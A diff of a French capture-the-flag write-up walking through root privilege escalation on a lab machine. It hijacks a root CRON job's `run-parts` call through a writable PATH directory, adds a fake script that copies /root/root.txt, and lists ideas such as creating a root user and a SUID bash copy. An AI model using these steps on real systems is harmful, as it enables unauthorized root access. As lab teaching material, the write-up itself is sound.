@@ -529,7 +529,7 @@ Une fois connecté en SSH en tant que `jkr`, tu appliques la méthodologie décr
 
 La première étape consiste toujours à vérifier les droits `sudo` :
 
-  ```
+  ```bash
   jkr@writeup:~$ sudo -l
   -bash: sudo: command not found
   ```
@@ -567,7 +567,7 @@ La méthode recommande ensuite d’observer l’activité du système en temps r
 
 Lors de l’analyse, tu remarques l’exécution régulière d’un script lancé par **CRON** en tant que root :
 
-  ```
+  ```txt
   /root/bin/cleanup.pl
   ```
 
@@ -613,7 +613,7 @@ Ici, `run-parts` est appelé **sans chemin absolu**. Lors de son exécution, roo
 
 En poursuivant l’énumération des permissions, la commande suivante permet d’identifier les répertoires accessibles en écriture par l’utilisateur `jkr` :
 
-```
+```bash
 find / -path /home -prune -o -type d -writable -print 2>/dev/null
 ```
 
@@ -627,9 +627,16 @@ Dans ce contexte, si `jkr` place son propre script nommé `run-parts` dans `/usr
 
 Pour exploiter le détournement de `PATH`, tu vas créer un **faux script `run-parts`** dans un répertoire présent dans le `PATH` et accessible en écriture par `jkr`, par exemple `/usr/local/bin`.
 
-Voici quelques idées pour des faux `run-parts` 
+Voici quelques idées pour des faux `run-parts` :
 
-1. Le plus simple: faire un `cat /root/root.txt > /tmp/root.txt`
+1. Le plus simple: faire un `cat` de /root/root.txt vers par exemple /tmp/root.txt`
+
+   ```bah
+   #!/bin/bash
+   cat /root/root.txt > /tmp/root.txt
+   ```
+
+   
 
 2. Ajouter/créer un utilisateur avec des droits root
 
@@ -639,6 +646,7 @@ Voici quelques idées pour des faux `run-parts`
    ```
 
    et faire `su jkrout`
+   
 
 3. Copier /bin/bash vers /bin/<nom au choix> et lui donner les droits SUID d'exécution root (u+s)
 
@@ -649,6 +657,7 @@ Voici quelques idées pour des faux `run-parts`
    ```
 
    et faire `/bin/ctf -p`
+   
 
 4. Lancer un reverse shell
 
